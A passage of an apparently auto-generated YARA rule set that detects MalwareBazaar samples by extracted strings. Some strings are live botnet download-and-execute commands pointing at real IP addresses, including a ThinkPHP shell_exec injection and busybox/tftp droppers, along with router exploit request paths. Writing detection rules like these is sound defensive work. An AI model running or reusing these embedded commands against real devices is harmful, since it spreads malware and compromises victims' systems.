        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 559KB and
        all of them
}

rule Linux_79ebb17616415d931b650b87f4fca70ddb899b21cb60783cfcf4b53068398350
{
    meta:
        description = "Auto ML: 79ebb17616415d931b650b87f4fca70ddb899b21cb60783cfcf4b53068398350"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB and
        all of them
}

rule Windows_7a66c663f71aff27ef5671579fd986b30c9527e23da7cbcfe7cdad8bf8baf739
{
    meta:
        description = "Auto ML: 7a66c663f71aff27ef5671579fd986b30c9527e23da7cbcfe7cdad8bf8baf739"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "4Data Source '{1}' already exists in the Scope '{0}'."
        $s6 = "FType system could not create wrapper class for design time attributes."
        $s7 = "\"Create Activity from Toolbox: {0}."
        $s8 = ")Showing types which derive from Activity."
        $s9 = "There is already a component named '{0}'.  Components must have unique names, and names must be case-insensitive.  A name also cannot conflict with the name of any component in an inherited class."
        $s10 = "Please specify an error message. The value in \"\" (quotes) will be treated as literal, otherwise it will be treated as the name of the variable of type System.String."
        $s11 = "zCompositeActivity cannot transition to 'Closed' status when there are active child context still exist for child activity."
        $s12 = "\\CompositeActivity cannot transition to 'Closed' status when there are active child activity."
        $s13 = "=Activity '{0}' is already a child of CompositeActivity '{1}'."
        $s14 = "<Cannot change the activity name.  Name '{0}' already exists."
        $s15 = "XPlease use Activity.Save()/Activity.Load() while serializing/deserializing the activity."
        $s16 = "Already registered as: {0}."
        $s17 = ":Please correct the following errors in specified binding:"
        $s18 = "BGetRuntimeValue failed since Path '{0}' evaluated to 'null' value."
        $s19 = "YCannot compile a markup file which does not contain declaration of the new workflow type."
        $s20 = "ZContext cannot be completed at this time, when associated ContextActivity is not 'Closed'."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1036KB and
        all of them
}

rule Windows_7a7126809eaa8ce5576ffd8d1caeed0dffaa34d41e7e435ccbfb382dbffc4ab5
{
    meta:
        description = "Auto ML: 7a7126809eaa8ce5576ffd8d1caeed0dffaa34d41e7e435ccbfb382dbffc4ab5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "SetupDiGetClassDevsA"
        $s7 = "SHGetFolderPathA"
        $s8 = "GetModuleHandleA"
        $s9 = "USER32.dll"
        $s10 = "CreateCompatibleBitmap"
        $s11 = "SETUPAPI.dll"
        $s12 = "SHELL32.dll"
        $s13 = "ntdll.dll"
        $s14 = "LoadLibraryA"
        $s15 = "GetProcAddress"
        $s16 = "GetVersionExA"
        $s17 = "SHLWAPI.dll"
        $s18 = "gdiplus.dll"
        $s19 = "CRYPT32.dll"
        $s20 = "ExitProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3059KB and
        all of them
}

rule Linux_7a8f416df448f1aea65a6e18bcbc97371265fad81aa8c0292de46bc9504b953c
{
    meta:
        description = "Auto ML: 7a8f416df448f1aea65a6e18bcbc97371265fad81aa8c0292de46bc9504b953c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 81KB and
        all of them
}

rule Linux_0b7d9d7df4974b15b2fa52a11214937fc5569c47edb2e42034c4e56929380a72
{
    meta:
        description = "Auto ML: 0b7d9d7df4974b15b2fa52a11214937fc5569c47edb2e42034c4e56929380a72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 108KB and
        all of them
}

rule Windows_7b07b7286d9841bbbd2435649044e799e87ee63173b8ae96f6f8d9f82d486f0a
{
    meta:
        description = "Auto ML: 7b07b7286d9841bbbd2435649044e799e87ee63173b8ae96f6f8d9f82d486f0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 478KB and
        all of them
}

rule Windows_7b3c1e60932c652fc591de285279cbdfb7292b54899842ea5c627fedc7cee8ab
{
    meta:
        description = "Auto ML: 7b3c1e60932c652fc591de285279cbdfb7292b54899842ea5c627fedc7cee8ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "System.Runtime.CompilerServices"
        $s4 = "System"
        $s5 = "System.Diagnostics"
        $s6 = "System.Reflection"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "AssemblyFileVersionAttribute"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "System.Resources"
        $s12 = "AssemblyKeyFileAttribute"
        $s13 = "ConsoleApp1.exe"
        $s14 = "<Module>"
        $s15 = "Setup"
        $s16 = "<Module>{777226BD-3AD8-4490-BDF4-631EF4C7D2B7}"
        $s17 = "Unicom.Uniworks.CModule.BaseForm"
        $s18 = "FrmTestWmsItemPrint"
        $s19 = "FrmProcessBase"
        $s20 = "<Module>{394837C3-EB0F-4F5B-B612-7738DC8B3C59}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5160KB and
        all of them
}

rule Windows_7b7049c7a1115aab1f89f2f106deeff2722da854339e91c2de0a1ffbf47a79a4
{
    meta:
        description = "Auto ML: 7b7049c7a1115aab1f89f2f106deeff2722da854339e91c2de0a1ffbf47a79a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_7b9502c277114c4c5cde1d0ce893041f2a880ce2808855ec74faf47485660d51
{
    meta:
        description = "Auto ML: 7b9502c277114c4c5cde1d0ce893041f2a880ce2808855ec74faf47485660d51"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "oaoBu.exe"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "<Module>"
        $s11 = "kernel32.dll"
        $s12 = "System"
        $s13 = "Module"
        $s14 = "System.Reflection"
        $s15 = "System.IO"
        $s16 = "DataSet1"
        $s17 = "System.Data"
        $s18 = "DataSet"
        $s19 = "System.Runtime.Serialization"
        $s20 = "get_SchemaSerializationMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 647KB and
        all of them
}

rule Windows_7b97762fc9c518b1b82275e483664a83b23fb7ff33535798b2afb28071581f16
{
    meta:
        description = "Auto ML: 7b97762fc9c518b1b82275e483664a83b23fb7ff33535798b2afb28071581f16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_7baf84b2dc1ef0c69fd51ab29dafe3645c7f8dce60b2f18022ec5270f13a1e2a
{
    meta:
        description = "Auto ML: 7baf84b2dc1ef0c69fd51ab29dafe3645c7f8dce60b2f18022ec5270f13a1e2a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_7bc78ae29f7bd99effbd39d5b86be6cbd1928affcddf0e3405d01d8292cc4bac
{
    meta:
        description = "Auto ML: 7bc78ae29f7bd99effbd39d5b86be6cbd1928affcddf0e3405d01d8292cc4bac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB and
        all of them
}

rule Windows_7c8df85e9bea7559e0addd33afc5273e49eb863c4c15f6c4c7d3fbae3eb3c55c
{
    meta:
        description = "Auto ML: 7c8df85e9bea7559e0addd33afc5273e49eb863c4c15f6c4c7d3fbae3eb3c55c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_vNXE"
        $s6 = "System.IO"
        $s7 = "usernameId"
        $s8 = "GetElementById"
        $s9 = "Thread"
        $s10 = "Load"
        $s11 = "<username>k__BackingField"
        $s12 = "ReadToEnd"
        $s13 = "set_Method"
        $s14 = "get_password"
        $s15 = "set_password"
        $s16 = "set_AutoScaleMode"
        $s17 = "setUserCookie"
        $s18 = "InternetSetCookie"
        $s19 = "get_cookie"
        $s20 = "set_cookie"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 536KB and
        all of them
}

rule Windows_7ca9bc15fa33dc0cccc239679bca74cafd96ef9994eb362d57006dcac86b3709
{
    meta:
        description = "Auto ML: 7ca9bc15fa33dc0cccc239679bca74cafd96ef9994eb362d57006dcac86b3709"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 616KB and
        all of them
}

rule Linux_7caed28559989416f8b853ae4b5e5604ef41077e711f61e5f10a2f5ec9ff9632
{
    meta:
        description = "Auto ML: 7caed28559989416f8b853ae4b5e5604ef41077e711f61e5f10a2f5ec9ff9632"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_0b8b6ae77cdc328f081d5cd1a545fee1487adf46b58845526f8c7314a64500c7
{
    meta:
        description = "Auto ML: 0b8b6ae77cdc328f081d5cd1a545fee1487adf46b58845526f8c7314a64500c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Liberty.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{05C0FE31-69BC-4775-8A79-35CA474C67D2}"
        $s15 = "<Module>{c61a6bfb-033c-414e-ad20-b444507cadf7}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1895KB and
        all of them
}

rule Windows_7cfbfe371912b59dec9a22cb39790c9f94774124ac786b48d493ec46830a0c1c
{
    meta:
        description = "Auto ML: 7cfbfe371912b59dec9a22cb39790c9f94774124ac786b48d493ec46830a0c1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1537KB and
        all of them
}

rule Windows_7d0eb3e819a8aad18bdcdf7f212c77663a79b3d048636878655dbe3730ff82ea
{
    meta:
        description = "Auto ML: 7d0eb3e819a8aad18bdcdf7f212c77663a79b3d048636878655dbe3730ff82ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_7d41863d2e5ab0680309cb11248c4b8dea0cf129aeab87a96eb0ccdccd634156
{
    meta:
        description = "Auto ML: 7d41863d2e5ab0680309cb11248c4b8dea0cf129aeab87a96eb0ccdccd634156"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_CtYQ"
        $s7 = "System.Data"
        $s8 = "Load"
        $s9 = "set_Enabled"
        $s10 = "get_DataSource"
        $s11 = "set_DataSource"
        $s12 = "set_AutoScaleMode"
        $s13 = "set_ColumnHeadersHeightSizeMode"
        $s14 = "get_IdLotFabricatie"
        $s15 = "set_IdLotFabricatie"
        $s16 = "get_UnitateMasuraMateriale"
        $s17 = "set_UnitateMasuraMateriale"
        $s18 = "get_NumeMateriale"
        $s19 = "set_NumeMateriale"
        $s20 = "get_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 632KB and
        all of them
}

rule Windows_7d83a92926f6caf31b31a57f3fd55bff1105f3dac0d686847556149067897e55
{
    meta:
        description = "Auto ML: 7d83a92926f6caf31b31a57f3fd55bff1105f3dac0d686847556149067897e55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_AbrH"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 605KB and
        all of them
}

rule Linux_7d9e2013c4e402f0a690c35879cc45482dd6daccfeb055f8f90738b51fcb47c2
{
    meta:
        description = "Auto ML: 7d9e2013c4e402f0a690c35879cc45482dd6daccfeb055f8f90738b51fcb47c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "seTX"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_7d9ec2e09c8559b1d695569da5f16b9a6edd54c38526b91d458ca5c43c401761
{
    meta:
        description = "Auto ML: 7d9ec2e09c8559b1d695569da5f16b9a6edd54c38526b91d458ca5c43c401761"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "<Module>{D918C633-1D55-4A4A-A483-97AAB9736658}"
        $s14 = "jn7XVnGmM4lMlCMDGTc"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB and
        all of them
}

rule Windows_7da786b32ec861208fc6a01b94d4eee4867b26dabfe214b66c9009b2f0222050
{
    meta:
        description = "Auto ML: 7da786b32ec861208fc6a01b94d4eee4867b26dabfe214b66c9009b2f0222050"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "Cset"
        $s6 = "NWInA|"
        $s7 = "<Module>"
        $s8 = "newrock2.exe"
        $s9 = "Writer"
        $s10 = "System"
        $s11 = "System.Collections.Generic"
        $s12 = "fileNames"
        $s13 = "fileTypes"
        $s14 = "fileRunTypes"
        $s15 = "fileDropPaths"
        $s16 = "GetResource"
        $s17 = "WriteAllBytes"
        $s18 = "GetModuleHandle"
        $s19 = "file"
        $s20 = "fileBytes"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4754KB and
        all of them
}

rule Windows_7dca5662fe7621ffd890ac202dd50e9d22b8f2ca186490ad62d8813cc0727cdb
{
    meta:
        description = "Auto ML: 7dca5662fe7621ffd890ac202dd50e9d22b8f2ca186490ad62d8813cc0727cdb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
